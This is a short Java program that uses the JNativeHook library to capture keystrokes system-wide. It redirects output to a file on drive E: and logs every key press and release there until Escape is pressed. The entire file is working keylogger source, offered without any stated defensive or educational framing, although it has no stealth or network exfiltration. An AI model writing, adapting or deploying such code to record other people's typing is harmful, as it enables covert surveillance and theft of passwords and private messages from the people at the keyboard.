// Juan Aguirre

package main;

import java.awt.event.KeyEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

	public static void main(String[] args) {
		try {
			System.setOut(new PrintStream(new FileOutputStream(new File("E://tx.txt"))));
			GlobalScreen.registerNativeHook();
		} catch (Exception e) {
			e.printStackTrace();
		}

		GlobalScreen.getInstance().addNativeKeyListener(new Main());
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		if(e.getKeyCode() == KeyEvent.VK_ESCAPE) {
			GlobalScreen.getInstance().removeNativeKeyListener(this);
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}

}
